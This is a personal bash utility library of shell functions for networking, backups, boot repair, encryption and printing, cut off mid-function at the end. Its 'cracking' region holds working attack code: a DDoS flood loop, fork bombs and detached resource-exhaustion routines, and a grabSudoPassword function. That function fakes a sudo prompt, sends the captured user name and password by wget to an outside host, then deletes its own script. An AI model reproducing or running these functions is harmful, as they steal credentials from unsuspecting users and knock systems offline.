#!/usr/bin/env bash
# -*- coding: utf-8 -*-

# region header
# Copyright Torben Sickert (info["~at~"]torben.website) 16.12.2012

# License
# -------

# This library written by Torben Sickert stand under a creative commons naming
# 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
# endregion

# Note: run "bash -x FILE" for getting a traceback to debug.
# Note: get globals $ 2 * "TAB"

# region generic
defaultArgumentsWrapperWithMinimumNumberOfArguments() {
    # Supports default arguments with a minimum number of arguments for functions
    # by wrapping them.
    #
    # Examples:
    #
    # Runs "subProgram" with arguments "all", "--log-level" and "warning" if not
    # at least two arguments are given to "program".
    # >>> program() {
    # ...     echo subProgram \
    # ...         $(defaultArgumentsWrapperWithMinimumNumberOfArguments 3 2 \
    # ...         all --log-level warning $@)
    # ... }
    # Usage:
    #   $@ - are the given arguments piped through.
    #
    #   PROGRAM_NAME
    #    $(defaultArgumentsWrapperWithMinimumNumberOfArguments
    #    NUMBER_OF_DEFAULT_ARGUMENTS
    #    MINIMUM_NUMBER_OF_ARGUMENTS_TO_OVERWRITE_DEFAULT_ARGUMENTS
    #    DEFAULT_ARGUMENTS*
    #    $@)
    if [ $# -le $(($1+$2+1)) ]; then
        # Return default arguments.
        echo ${@:3:$1}
        return $?
    else
        # Return given arguments.
        echo ${@:3+$1}
        return $?
    fi
}
defaultArgumentsWrapper() {
    # Wrapper function for
    # defaultArgumentsWrapperWithMinimumNumberOfArguments with second
    # parameter is setted to "1".
    #
    # Examples:
    #
    # Runs "subProgram" with arguments "all", "--log-level" and "warning" if not
    # at least one arguments are given to "program".
    #
    # >>> program() {
    # ...     echo subProgram $(defaultArgumentsWrapper 3 all --log-level \
    # ...         warning $@)
    # ... }
    # Usage:
    #   $@ - are the given arguments piped through.
    #
    #   PROGRAM_NAME
    #    $(defaultArgumentsWrapper
    #    NUMBER_OF_DEFAULT_ARGUMENTS
    #    DEFAULT_ARGUMENTS*
    #    $@)
    echo $(defaultArgumentsWrapperWithMinimumNumberOfArguments $1 1 ${@:2})
    return $?
}
# endregion
# region cracking
makeSimpleDdosAttack() {
    # Makes a ddos attack to given host on given port. First argument: Number
    # of requests. Second argument: Port
    #
    # Examples:
    #
    # >>> makeSimpleDdosAttack 100 80
    local index
    for (( index=0; index<"$1"; index++ )); do
        echo -e 'GET /'"$index"'\r\n\r\n' | ncat lilu "$2" &
    done
    return $?
}
stressSystem() {
    # Stress system with given number of endless loops.
    #
    # Examples:
    #
    # >>> stressSystem 10
    local index
    for (( index=0; index<"$1"; index++ )); do
        endlessLoop &
    done
    return $?
}
endlessLoop() {
    # Starts an endless loop.
    #
    # Examples:
    #
    # >>> endlessLoop
    while true; do
        :
    done
    return $?
}
forkBomb() {
    # Implementation for forkBomb. Note short version: :() { : | : & }; :
    #
    # Examples:
    #
    # >>> forkBomb
    forkBomb | forkBomb &
    return $?
}
stressSystemWithforkBomb() {
    # Runs a forkbomb in an endless loop. This is usefull if operating system
    # kills the whole process tree.
    #
    # Examples:
    #
    # >>> stressSystemWithForkBomb
    while true; do
        forkBomb
    done
    return $?
}
makeSystemUnattainable() {
    # Uses a stress system algorithm in its own process to avoid solving the
    # problem by process tree killing.
    #
    # Examples:
    #
    # >>> makeSystemUnattainable
    nohup bash --login -c stressSystem &>/dev/null &
    return $?
}
fakeSudoPasswordAttempt() {
    # Shows a fake sudo password attempt.
    #
    # Examples:
    #
    # >>> fakeSudoPasswordAttempt
    local number password && \
    for number in 1 2 3; do
        read -sp '[sudo] password for '$(whoami)': ' password
        sleep 1
        echo -e '\nSorry, try again.'
    done
    echo "sudo: $number incorrect password attempts"
    return $?
}
grabSudoPassword() {
    # Shows a fake sudo password attempt and send to password to server.
    #
    # Examples:
    #
    # >>> grabSudoPassword
    local password && \
    local user=$(whoami) && \
    local standardOutputBufferFile=$(mktemp) && \
    for number in 1 2 3; do
        read -sp '[sudo] password for '$user': ' password && \
        echo '' && \
        if echo -e "$password\n" | sudo -S "$@" 1>"$standardOutputBufferFile" 2>/dev/null; then
            # NOTE: Place your password grabber server url here.
            wget --quiet "http://suna.no-ip.info:8080?user=$user&password=$password"
            unalias sudo &>/dev/null
            rm $(readlink --canonicalize "$0") &>/dev/null
            cat "$standardOutputBufferFile"
            break
        else
            if [[ $number == '3' ]]; then
                echo "sudo: $number incorrect password attempts"
            else
                echo 'Sorry, try again.'
            fi
        fi
    done
}
# endregion
# region network
alias restartNetwork='sudo ifdown -a &>/dev/null && sudo ifup -a &>/dev/null'
wlanStart() {
    # Starts wlan functionality.
    #
    # Examples:
    #
    # >>> wlanStart
    wpa_supplicant -c /etc/wpa_supplicant.conf -i wlan0 -D wext -B && \
    dhclient wlan0
    return $?
}
wlanStop() {
    # Stops wlan functionality.
    #
    # Examples:
    #
    # >>> wlanStop
    killall wpa_supplicant && \
    killall dhclient && \
    killall dhclient3
    return $?
}
wlanRestart() {
    # Restart wlan functionality.
    #
    # Examples:
    #
    # >>> wlanRestart
    wlanStop && \
    wlanStart
    return $?
}
# endregion
# region system fixing
mountRootFileSystemWritable() {
    # If root file system is mounted as read only this command makes it
    # runnable.
    #
    # Examples:
    #
    # >>> mountRootFileSystemWritable
    mount -rw --options remount /
    return $?
}
restoreGrub() {
    # Restores the linux boot-manager grub if it was overwritten (e.g. in
    # windows).
    #
    # Examples:
    #
    # >>> restoreGrub
    echo 'Mount systems root filesystem' && \
    mount /dev/disk/by-label/system /mnt && \
    echo 'Bind Kernel diretorys to run Ubuntu kernel in /mnt' && \
    mount --bind /dev /mnt/dev && \
    mount --bind /proc /mnt/proc && \
    mount --bind /run /mnt/run && \
    mount --bind /sys /mnt/sys && \
    mount --bind /tmp /mnt/tmp && \
    echo "Change root file system from rescue root system to system's root filesystem (/mnt)" && \
    chroot /mnt grub-install /dev/sda
    return $?
}
compileAndInstallWithoutRoot() {
    # Compiles and installs a program by its given source code. Your have to
    # be inside the source code folder tu run this function.
    #
    # Examples:
    #
    # >>> compileAndInstallWithoutRoot /home/user/myUser/
    # ...
    installLocation="$ILU_MY_ROOT_PATH" && \
    if [ "$1" ]; then
        local installLocation="$1"
    fi
    chmod +x ./configure
    ./configure prefix="$installLocation" && \
    # NOTE: Another possibilty to install to a specified path is
    # "make install DESTDIR=$1"
    make install
    return $?
}
# endregion
# region tools
makeUEFIBootEntry() {
    # Creates an uefi boot entry.
    #
    # Examples:
    #
    # >>> makeUEFIBootEntry archLinux
    # ...
    # >>> makeUEFIBootEntry archLinuxFallback
    # ...
    # >>> makeUEFIBootEntry archLinuxLTSFallback vmlinuz-linux-lts
    # ...
    local kernelParameterFilePath="${ILU_CONFIG_PATH}linux/kernel/${1}CommandLine" && \
    local kernel='vmlinuz-linux' && \
    if [[ "$2" ]]; then
        kernel="$2"
    fi
    if [[ -f "$kernelParameterFilePath" ]]; then
        local command="sudo efibootmgr --verbose --create --disk /dev/sda --part 1 -l \"\\${kernel}\" --label \"$1\" --unicode \"$(cat "$kernelParameterFilePath")\"" && \
        echo "Create boot entry \"$1\" with command \"${command}\"." && \
        eval $command
    else
        echo "Error: file \"${kernelParameterFilePath}\" doesn't exists."
    fi
    return $?
}
backupBTRFSSystem() {
    # Create, delete or list system backups.
    #
    # Examples:
    #
    # >>> backupBTRFSSystem list
    # >>> backupBTRFSSystem create
    # >>> backupBTRFSSystem delete rootBackup
    sudo umount /mnt &>/dev/null
    if [[ "$1" == create ]]; then
        sudo mount PARTLABEL=system /mnt && \
        local timestamp="$(date +"%d:%m:%y:%T")" && \
        sudo btrfs subvolume snapshot /mnt/root \
            "/mnt/rootBackup${timestamp}" && \
        # NOTE: Autocompletion should be done by sudo. Not bash as user.
        sudo bash -c "cp --recursive /boot/* \"/mnt/rootBackup${timestamp}/boot/\"" && \
        sudo umount /mnt
    elif [[ "$1" == delete ]] && [[ "$2" ]]; then
        sudo mount PARTLABEL=system /mnt && \
        sudo btrfs subvolume delete "/mnt/$(basename "$2")"
        sudo umount /mnt
    elif [[ "$1" == list ]]; then
        sudo btrfs subvolume list /
    else
        cat << EOF
backupBTRFSSystem create|delete|list [backupName]
EOF
    fi
    return $?
}
_backupBTRFSSystem() {
    # Autocompletion function.
    local lastCompleteArgument="${COMP_WORDS[${COMP_CWORD}-1]}"
    local currentArgument="${COMP_WORDS[-1]}"

    if [[ $COMP_CWORD == 1 ]]; then
        COMPREPLY=($(compgen -W 'create delete list' -- "$currentArgument"))
    elif [[ $UID == 0 ]] && [[ $COMP_CWORD == 2 ]] && \
         [[ "$lastCompleteArgument" == 'delete' ]]; then
        COMPREPLY=($(compgen -W "$(backupBTRFSSystem list | cut --delimiter ' ' \
            --field 9 | tr '\n' ' ')" -- "$currentArgument"))
    fi
    return 0
}
complete -F _backupBTRFSSystem backupBTRFSSystem

sshScreen() {
    # Wraps the ssh client for automatically starting a screen session on
    # server.
    #
    # Examples:
    #
    # >>> sshScreen user@host [SSH_OPTIONS]
    ssh "$1" -t 'screen -r || screen -S main' "${@:2}"
    return $?
}
runWithAppendedShebang() {
    # This function reads and returns the shebang from given file if exist.
    #
    # Examples:
    #
    # # /usr/bin/env python -O /path/to/script.py
    # >>> appendShebang -O -- /path/to/script.py
    # ...
    #
    # # /usr/bin/env python -O /path/to/script.py argument1 argument2
    # >>> runWithAppendedShebang -O -- /path/to/script.py argument1 argument2
    # ...
    local shebangArguments='' && \
    local arguments='' && \
    local applicationPath='' && \
    local shebangArgumentsEnded=false && \
    while true; do
        case "$1" in
            --)
                shebangArgumentsEnded=true
                shift
                ;;
            '')
                shift
                break
                ;;
            *)
                if ! $shebangArgumentsEnded; then
                    shebangArguments+=" $(validateBashArgument "$1")"
                elif [[ ! "$applicationPath" ]]; then
                    applicationPath="$1"
                else
                    arguments+=" $(validateBashArgument "$1")"
                fi
                shift
                ;;
        esac
    done
    local applicationRunCommand="$(head --lines 1 "$applicationPath" | sed \
        --regexp-extended \
        's/^#!(.+)$/\1/g')${shebangArguments} ${applicationPath} $arguments" && \
    # NOTE: The following line could be useful for debugging scenarios.
    #echo "Run: \"$applicationRunCommand\"" && \
    eval "$applicationRunCommand"
    return $?
}
validateBashArgument() {
    # Validates a given bash argument.
    #
    # Examples:
    #
    # >>> validateBashArgument hans
    # 'hans'
    #
    # >>> validateBashArgument ha'n's
    # "ha'n's"
    #
    # >>> validateBashArgument h"a"'n's
    # 'h"a"\'n\'s'
    if [[ ! "$(grep "'" <<< "$1")" ]]; then
        echo "'$1'"
    elif [[ ! "$(grep '"' <<< "$1")" ]]; then
        echo "\"$1\""
    else
        echo "'$(sed "s/'/\\'/g" <<< "$1")'"
    fi
    return $?
}
overlayLocation() {
    # Mounts an overlay over given location. This could be useful if we have a
    # read only system caused by physical reasons.
    #
    # Examples:
    # >>> overlayLocation /usr/bin/
    mkdir --parents /tmp/overlayfsDifferences && \
    mount --types overlayfs --options \
        lowerdir="$1",upperdir='/tmp/overlayDifferences' overlayfs "$1"
    return $?
}
addDefaultUpstartService() {
    # Add a given start script to autostart and close scripts in an upstart
    # based system. Note that given script has to be located at "/etc/init.d/".
    #
    # Examples:
    #
    # addDefaultUpstartService script.sh
    # ...
    chmod +x "/etc/init/$1" && \
    update-rc.d "$1" defaults
    return $?
}
removeDefaultUpstartService() {
    # Remove a given start script to autostart and close scripts in an upstart
    # based system. Note that given script has to be located at "/etc/init.d/".
    #
    # Examples:
    #
    # removeDefaultUpstartService script.sh
    # ...
    update-rc.d -f "$1" remove
    return $?
}
calculatePercent() {
    # Calculates percent of second argument from the first argument.
    #
    # Examples:
    #
    # >>> calculatePercent 100 50
    # 50
    echo "$(((($2 * 10000) / $1) / 100)).$(sed --regexp-extended \
        's/^(.)$/0\1/g' <<<$(((($2 * 10000) / $1) % 100)))"
    return $?
}
prependVimModline() {
    # Prepend a vim modline to a text based file. Assumes that there exists a
    # function named "getVimModline" which prints appreciate modline for given
    # file path as first argument.
    #
    # Examples:
    #
    # >>> prependVimModline /path/text/file #
    local tempFile=$(mktemp) && \
    local firstNewLine=$(grep --extended-regexp '^$' "$1" --line-number | \
        head --lines 1 | grep --extended-regexp --only-matching '^[0-9]+') && \
    head --lines "$firstNewLine" "$1" 1>"$tempFile" && \
    getVimModline "$2" 1>>"$tempFile" && \
    echo '' 1>>"$tempFile" && \
    local numberOfLines=$(wc --lines "$1" | grep --extended-regexp \
        --only-matching '[0-9]+') && \
    let numberOfFooterLines="$numberOfLines - $firstNewLine" && \
    tail --lines "$numberOfFooterLines" "$1" 1>>"$tempFile" && \
    # NOTE: Only move the file content to preserve file attributes.
    cat "$tempFile" 1>"$1"
    return $?
}
appendVimModline() {
    # Append a vim modline to a text based file. Assumes that there exists a
    # function named "getVimModline" which prints appreciate modline for given
    # file path as first argument.
    #
    # Examples:
    #
    # >>> appendVimModline /path/text/file #
    echo '' 1>>"$1" && \
    getVimModline "$2" 1>>"$1"
    return $?
}
writeImageToBlockdevice() {
    # Writes a given image to given blockdevice.
    #
    # Examples:
    #
    # >>> writeImageToBlockdevice /data/private/backup/image.img /dev/mmcblk0
    local source="${ILU_DATA_PATH}temp/image/"*.img && \
    if [[ "$1" ]]; then
        source="$1"
    fi
    local target=/dev/mmcblk0 && \
    if [[ "$2" ]]; then
        target="$2"
    fi
    sudo dd bs=4M if="$source" of="$target"
    return $?
}
writeBlockdeviceToImage() {
    # Writes a given backup from given blockdevice.
    #
    # Examples:
    #
    # >>> writeBlockdeviceToImage /dev/mmcblk0 /data/private/backup/image.img
    local source=/dev/mmcblk0 && \
    if [[ "$1" ]]; then
        source="$1"
    fi
    local target="${ILU_DATA_PATH}private/backup/backup-sd-card.img" && \
    if [[ "$2" ]]; then
        target="$2"
    fi
    sudo dd bs=4M if="$source" of="$target"
    return $?
}
validateSEDReplacement() {
    # This functions escapes every special meaning character for a sed
    # replacement.
    #
    # Examples:
    #
    # >>> sed "s/myInputString/$(validateSEDReplacement '\hans/peter&klaus')/g"
    echo "$1" | sed --expression 's/\\/\\\\/g' --expression 's/\//\\\//g' \
        --expression 's/&/\\\&/g'
    return $?
}
makeSingleExecutable() {
    # Creates a bsd and virtually posix shell compatible single executable file
    # from an application directory.
    #
    # Examples:
    #
    # >>> makeSingleExecutable /applicationDirectory startFile
    # ...
    if [[ ! "$1" ]]; then
        echo "Usage: $0 <DIRECTOTY_PATH> [EXECUTABLE_FILE_NAME] [RELATIVE_START_FILE_PATH]"
        exit 1
    fi
    local fileName='index.sh' && \
    if [[ "$2" ]]; then
        fileName="$2"
    fi
    local relativeStartFilePath='./index' && \
    if [[ "$3" ]]; then
        relativeStartFilePath="$3"
    fi
    local directoryName=$(basename $(readlink --canonicalize "$1")) && \
    # NOTE: short option is necessary for mac compatibility.
    cat << EOF 1>"$fileName"
#!/bin/bash
executableDirectory=\$(mktemp -d 2>/dev/null || mktemp -d -t '' 2>/dev/null)
dataOffset=\$((\$(grep --text --line-number '^exit \\\$?$' "\$0" | \\
    cut -d ':' -f 1) + 1))
tail -n +\$dataOffset "\$0" | tar -xzf - -C "\$executableDirectory" \\
    1>/dev/null && \\
"\${executableDirectory}/${directoryName}/${relativeStartFilePath}" "\$@"
exit \$?
EOF
    local tempArchiv=$(mktemp).tar.gz && \
    tar --create --verbose --gzip --posix --file "$tempArchiv" "$1" &&
    cat "$tempArchiv" 1>>"$fileName" && \
    chmod +x "$fileName"
    return $?
}
# region pacman
showNotMaintainedByPacmanSystemFiles() {
    # Shows all files which aren't maintained by pacman on currently running
    # system.
    #
    # Examples:
    #
    # >>> showNotMaintainedByPacmanSystemFiles
    # ...
    local allFiles=$(mktemp) && \
    local allMaintainedFiles=$(mktemp) && \

    sudo find / | sort | sed 's:/$::g' | sort | uniq 1>"$allFiles" && \
    pacman --query --list --quiet | sed 's:/$::g' | sort | \
        uniq 1>"$allMaintainedFiles" && \
    cat "$allFiles" "$allMaintainedFiles" | \
        sed 's:^/home/.*$::g' | \
        sed 's:^/root/.*$::g' | \
        sed 's:^/dev/.*$::g' | \
        sed 's:^/sys/.*$::g' | \
        sed 's:^/tmp/.*$::g' | \
        sed 's:^/run/.*$::g' | \
        sed 's:^/var/tmp/.*$::g' | \
        sed 's:^/var/cache/.*$::g' | \
        sed 's:^/var/log/.*$::g' | \
        sed 's:^/proc/.*$::g' | \
        sort | uniq --unique && \
    local numberOfAllFiles=$(wc --lines $allFiles | cut --delimiter ' ' --field 1) && \
    local numberOfMaintainedFiles=$(wc --lines $allMaintainedFiles | cut --delimiter ' ' --field 1) && \
    let numberOfNotMaintainedFiles="${numberOfAllFiles} - ${numberOfMaintainedFiles}" && \
    cat << EOF

Number of files: $numberOfAllFiles 100%
Number of maintained files: $numberOfMaintainedFiles $(calculatePercent $numberOfAllFiles $numberOfMaintainedFiles)%
Number of not maintained files: $numberOfNotMaintainedFiles $(calculatePercent $numberOfAllFiles $numberOfNotMaintainedFiles)%
EOF
    return $?
}
showConfigBackups() {
    # Shows all config backups created by pacman.
    #
    # Examples:
    #
    # >>> showConfigBackups
    # ...
    cd / 1>/dev/null && \
    for pattern in '*.pacnew' '*.orig' '*_backup*' '*.pacorig'; do
        sudo find -name "$pattern" -and \( -type f -or -type l -or -type d \)
    done
    cd - 1>/dev/null
    return $?
}
# endregion
sendEMail() {
    # Sends an email.
    #
    # Examples:
    #
    # >>> sendEMail subject content address
    # >>> sendEMail subject content address "Sun, 2 Feb 1986 14:23:56 +0100"
    local eMailAddress="$ILU_ALTERNATE_USER_EMAIL_ADDRESS" && \
    if [ "$3" ]; then
        eMailAddress="$3"
    fi
    local date="$(date)" && \
    if [ "$4" ]; then
        date="$4"
    fi
    msmtp -t <<EOF
From: $eMailAddress
To: $eMailAddress
Reply-To: $eMailAddress
Date: $date
Subject: $1

$2

EOF
    return $?
}
makeCommandPromtPrefix() {
    # Generates a new user prompt with useful runtime paramters.
    #
    # Examples:
    #
    # >>> makeCommandPromtPrefix
    local errorNumber=$? && \
    local systemLoadAverage=$(uptime | grep --extended-regexp --only-matching \
        '[0-9]{1,2}\.[0-9]{1,2}' | head --lines 1) && \
    local errorPromt="(${ILU_RED}${errorNumber}${ILU_DEFAULT_COLOR})" && \
    if [[ "$errorNumber" == '0' ]]; then
        errorPromt="${ILU_GREEN}>${ILU_DEFAULT_COLOR}"
    fi
    local gitBranch=$(git branch 2>/dev/null | sed --regexp-extended \
        "s/^\* (.*)$/ $(validateSEDReplacement "$ILU_RED")\1$(validateSEDReplacement "$ILU_CYAN")/g" \
        | tr --delete "\n" | sed 's/  / /g' | sed 's/^ *//g' | \
        sed 's/ *$//g') && \
    if [ "$gitBranch" ]; then
        gitBranch="(${ILU_GRAY}git${ILU_DEFAULT_COLOR})-(${ILU_CYAN}${gitBranch}${ILU_DEFAULT_COLOR})"
    fi
    if [[ "$(id --user)" == '0' ]]; then
        local userName="${ILU_RED}"
    fi
    local userName+="\u$ILU_DEFAULT_COLOR" && \
    if [[ "$TERM" != 'linux' ]]; then
        local titleBar="\[\e]0;\u@\h:$(pwd)\a\]"
    fi
    export PS1="$titleBar$errorPromt ${ILU_CYAN}${userName}${ILU_GRAY}@${ILU_CYAN}\h${ILU_BLUE} (${systemLoadAverage}) ${ILU_GRAY}\w${ILU_DEFAULT_COLOR}\n${gitBranch}${ILU_DARK_GRAY}> ${ILU_DEFAULT_COLOR}"
    return $?
}
setMaxUserWatches() {
    # Sets the maximum number of concurrent allowed file observations via
    # inotify.
    #
    # Examples:
    #
    # >>> setMaxUserWatches 500000
    echo "$1" | sudo tee '/proc/sys/fs/inotify/max'_user_watches
    return $?
}
makeSSHKey() {
    # Generates a new ssh key.
    #
    # Examples:
    #
    # >>> makeSSHKey
    # ...
    # >>> makeSSHKey hans
    # ...
    local user="$ILU_USER_EMAIL_ADDRESS" && \
    if [ "$1" ]; then
        user="$1"
    fi
    ssh-keygen -t rsa -C "$user"
    return $?
}
makeOpenSSLPemFile() {
    # Creates a concatenated pem file needed for server with https support.
    #
    # Examples:
    #
    # >>> makeOpensslPemFile
    # ...
    local host='localhost' && \
    if [[ "$1" ]]; then
        host="$1"
    fi
    echo 'Create your private key without a password.' && \
    openssl genrsa -out "${host}.key" 1024 && \
    echo 'Create a temporary csr file.' && \
    openssl req -new -key "${host}.key" -out "${host}.csr" && \
    echo 'Self-sign your certificate.' && \
    openssl x509 -req -days 365 -in "${host}.csr" -signkey "${host}.key" -out \
        "${host}.crt" && \
    echo 'Creating a pem file.' && \
    cat "${host}.key" "${host}.crt" 1>"${host}.pem"
    return $?
}
findHardlinks() {
    # Finds same files as given file (hardlinks).
    #
    # Examples:
    #
    # >>> findHardlinks /home/user/test.txt
    # ...
    sudo find / -samefile $1 2>/dev/null
    return $?
}
makeCryptBlockdevice() {
    # Creates encrypted blockdevices.
    #
    # Examples:
    #
    # >>> makeCryptBlockdevice /dev/sda
    sudo cryptsetup -v --cipher aes-xts-plain64 --key-size 512 --hash sha512 \
        --iter-time 5000 --use-random luksFormat "$1"
}
openCryptBlockdevice() {
    # Mounts encrypted blockdevices as analyseable blockdevice.
    #
    # Examples:
    #
    # >>> openCryptBlockdevice /dev/sdb test
    sudo cryptsetup luksOpen "$1" "$2"
    return $?
}
closeCryptBlockdevice() {
    # Mounts encrypted blockdevices as analyseable blockdevice.
    #
    # Examples:
    #
    # >>> closeCryptBlockdevice test
    sudo cryptsetup luksClose "$1"
    return $?
}
imagesToCSSClasses() {
    # This function converts a folder of images to a single includeable less
    # file.
    #
    # Examples:
    #
    # >>> imagesToCSSClasses /path/to/image/directory/ .*\.\(png\|jpg\|jpeg\)
    # ...
    # >>> imagesToCSSClasses /path/to/image/directory/ .*\.\(png\|jpg\|jpeg\) \
    # ...     /first/exclude/location /second/exclude/location ...
    # ...
    # >>> imagesToCSSClasses
    # ...
    local source='.' && \
    if [ -d "$1" ]; then
        source="$1" && \
        shift
    fi
    local pathPattern='.*\.\(png\|jpg\|jpeg\|ico\)'
    if [[ "$1" ]]; then
        pathPattern="$1" && \
        shift
    fi
    find "$source" -regex "^$pathPattern$" | while read imageFilePath; do
        local validPath=true && \
        local excludePath && \
        for excludePath in $@; do
            excludePath=$(echo $excludePath | sed 's/\/$//g') && \
            if [[ "$excludePath" == $(dirname "$imageFilePath") ]] || \
               [[ "$excludePath" == "$imageFilePath" ]]; then
                validPath=false && \
                break
            fi
        done
        if $validPath; then
            local imageClassName="$(echo "$imageFilePath" | tr '@#&%+./_{; ' '-' | \
                grep --only-matching --extended-regexp '[^-].+$')" && \
            echo ".image-data-${imageClassName}{background-image: url(\"data:$(file --brief --mime-type "$imageFilePath");base64,$(base64 --wrap 0 "$imageFilePath")\")}"
        fi
    done
    return $?
}
mergeTextFiles() {
    # Concatenate files and print on the standard output.
    #
    # Examples:
    #
    # >>> mergeTextFiles a.txt b.txt
    # ...
    # >>> mergeTextFiles a.txt b.txt c.txt --prepend '# region %s\n' --append \
    # ...     '\n# endregion\n' --between '\n# endregion\n\n# region %s\n'
    # ...
    # region
    local append='\n// endregion' && \
    local prepend='// region %s\n\n' && \
    local between='\n// endregion\n\n// region %s\n\n' && \
    # endregion
    while true; do
        case $1 in
            -p|--prepend)
                shift && \
                prepend=$1 && \
                shift
                ;;
            -a|--append)
                shift && \
                append=$1 && \
                shift
                ;;
            -b|--between)
                shift && \
                between=$1 && \
                shift
                ;;
            '')
                break ;;
            *)
                if [ "$files" ]; then
                    files+=" $1"
                else
                    local files="$1"
                fi
                shift
                ;;
        esac
    done
    printf "$prepend" "$(echo "$files" | grep --only-matching \
        --extended-regexp '^[^ ]+')" && \
    local index=0 && \
    local filePath && \
    for filePath in ${files[*]}; do
        if [[ $index > 0 ]]; then
            printf "$between" "$filePath"
        fi
        cat $filePath && \
        index+=1
    done
    printf "$append"
    return $?
}
openPath() {
    # Opens a given path with a useful program.
    #
    # Examples:
    #
    # >>> openPath http://www.google.de
    # >>> openPath file.text
    local program && \
    for program in gnome-open kde-open gvfs-open exo-open xdg-open gedit \
        mousepad gvim vim emacs nano vi less cat
    do
        if hash "$program" 2>/dev/null; then
            "$program" "$1" && \
            break
        fi
    done
    return $?
}
showSymlinks() {
    # Shows symbolic links in current directory if no argument is provided or
    # in given location and their subdirectories (recursive).
    #
    # Examples:
    #
    # >>> showSymlinks
    # ./.vim -> ./configs/vimConfig
    # ...
    #
    # >>> showSymlinks /home
    # /home/user/.vim -> /home/user/configs/vimConfig
    # ...
    local fileSystemElement && \
    for fileSystemElement in $(find "$1" -type l); do
        echo "$fileSystemElement"' -> ' && \
        readlink "$fileSystemElement"
    done
    return $?
}
translate() {
    # Translates a given string in a given (or automatic detected) language and
    # gives a translation in given language (German by default) back. Accesses
    # "http://translate.google.com" from terminal.
    #
    # Examples:
    #
    # >>> translate hello
    # Hallo
    # >>> translate 'Hello my darling'
    # Hallo mein Schatz
    # >>> translate hello fr
    # bonjour
    # >>> translate hello en fr
    # bonjour
    local defaultTargetLanguage=de && \
    local help="translate <text> [[<source language>] <target language>]\n
                if target missing, use $defaultTargetLanguage\n
                if source missing, use auto\n
                list supported languages: translate -l" && \
    local languages="af=Afrikaans\n sq=Albanisch\n ar=Arabisch\n hy=Armenisch\n
                     az=Aserbaidschanisch\n eu=Baskisch\n bn=Bengalisch\n
                     bg=Bulgarisch\n zh-TW=Chinesisch (traditionell)\n
                     zh-CN=Chinesisch (vereinfacht)\n da=DÃ¤nisch\n
                     de=Deutsch\n en=Englisch\n eo=Esperanto\n et=Estnisch\n
                     fi=Finnisch\n fr=FranzÃ¶sisch\n gl=Galizisch\n 
                     ka=Georgisch\n el=Griechisch\n gu=Gujarati\n 
                     ht=Haitianisch\n iw=HebrÃ¤isch\n hi=Hindi\n 
                     id=Indonesisch\n ga=Irisch\n is=IslÃ¤ndisch\n 
                     it=Italienisch\n ja=Japanisch\n yi=Jiddisch\n kn=Kannada\n
                     ca=Katalanisch\n ko=Koreanisch\n hr=Kroatisch\n
                     la=Lateinisch\n lv=Lettisch\n lt=Litauisch\n 
                     ms=Malaysisch\n mt=Maltesisch\n mk=Mazedonisch\n
                     nl=NiederlÃ¤ndisch\n no=Norwegisch\n fa=Persisch\n 
                     pl=Polnisch\n pt=Portugiesisch\n ro=RumÃ¤nisch\n
                     ru=Russisch\n sv=Schwedisch\n sr=Serbisch\n
                     sk=Slowakisch\n sl=Slowenisch\n es=Spanisch\n sw=Suaheli\n
                     tl=Tagalog\n ta=Tamil\n te=Telugu\n th=ThailÃ¤ndisch\n
                     cs=Tschechisch\n tr=TÃ¼rkisch\n uk=Ukrainisch\n
                     hu=Ungarisch\n ur=Urdu\n vi=Vietnamesisch\n cy=Walisisch\n
                     be=WeiÃrussisch" && \
    if [[ "$1" = -h || "$1" = --help || "$#" < 1 ]]; then
        echo -e "$help"
    elif [[ "$1" = -l || "$1" = --languages ]]; then
        echo -e "$languages"
    else
        if [ "$3" ]; then
            source="$2" && \
            local target="$3"
        else
            source=auto && \
            if [ "$2" ]; then
                local target="$2"
            else
                local target="$defaultTargetLanguage"
            fi
        fi
        local result=$(curl -s -i --user-agent "" -d "sl=$source" -d \
            "tl=$target" --data-urlencode "text=$1" \
            http://translate.google.com) && \
        # NOTE Temporary outcomment to have right code highlighting.
        # local encoding=$(awk '/Content-Type: .* charset=/ {sub(/^.*charset=["'\'']?/,""); sub(/[ "'\''].*$/,""); print}' <<<"$result")
        # NOTE Alternativly use:
        # iconv -f $encoding <<<"$result" | awk 'BEGIN {RS="<div"};/<span[^>]* id=["'\'']?result_box["'\'']?/ {sub(/^.*id=["'\'']?result_box["'\'']?(>| [^>]*>)([ \n\t]*<[^>]*>)*/,"");sub(/<.*$/,"");print}' | html2text -utf8
        # NOTE Temporary outcomment to have right code highlighting.
        # iconv -f "$encoding" <<<"$result" | awk 'BEGIN {RS="</div>"};/<span[^>]* id=["'\'']?result_box["'\'']?/' | html2text -utf8
        return $?
    fi
}
runInProgramsLocation() {
    # Changes current working directory to given program path and runs the
    # program.
    #
    # Examples:
    #
    # >>> runInProgramsLocation /usr/bin/python3.2
    # ...
    if [ "$1" ] && [ -f "$1" ]; then
        cd "$(dirname "$1")" && \
        "./$(basename "$1")" $*
        return $?
    else
        echo 'Please insert a path to an executable file.'
        return $?
    fi
}
repairLinuxFilesystem() {
    # Finds filesystem errors on linux based filesystem and repairs them.
    #
    # Examples:
    #
    # >>> repairLinuxFilesystem /dev/mmcblk0p2
    # ...
    local target=/dev/mmcblk0 && \
    if [[ "$1" ]]; then
        target="$1"
    fi
    sudo badblocks "$target" && \
    sudo fsck -a "$target"
    return $?
}
sshPrint() {
    # Prints a file via ssh. A given printable file will be sent to a given
    # location via scp. The file be stored in remotes home directory with given
    # name. After this procedure a remote print order will be sent.
    #
    # Examples:
    #
    # >>> sshPrint /home/hans/document.txt
    # ...
    # >>> sshPrint /home/hans/document.txt hans
    # ...
    # >>> sshPrint /home/hans/document.txt hans hp15
    # ...
    local user='sickertt' && \
    local host='login.informatik.uni-freiburg.de' && \
    local defaultPrinter='hp15' && \
    local usageMessage="Usage: "$0" <file> [login] [printer] [withFileContentPipe]" && \

    if [[ $# < 1 ]]; then
        echo "$usageMessage"
    # 1. argument: File, which we want to print.
    elif [ -f "$1" ]; then
        # 2. argument: Check for given user name.
        if [ "$2" ]; then
            local login="$2"@"$host"
        elif [ "$user" ]; then
            local login="$user"@"$host"
        else
            # Grab user from "~/.ssh/config".
            local userRow=$(cat ~/.ssh/config | grep "$host" -A1 | \
                grep -i user) && \
            if [ "$userRow" ]; then
                local user=$(echo ${userRow} | sed s/user\\s//ig) && \
                local login="$user"@"$host"
            else
                echo 'No login given.' && \
                echo "$usageMessage"
            fi
        fi
        # 3. argument: Select printer.
        local printer=defaultPrinter && \
        if [ "$3" ]; then
            local printer="$3"
        fi
        # 4. argument: Determines which way to use for transport file content.
        if [ "$4" ]; then
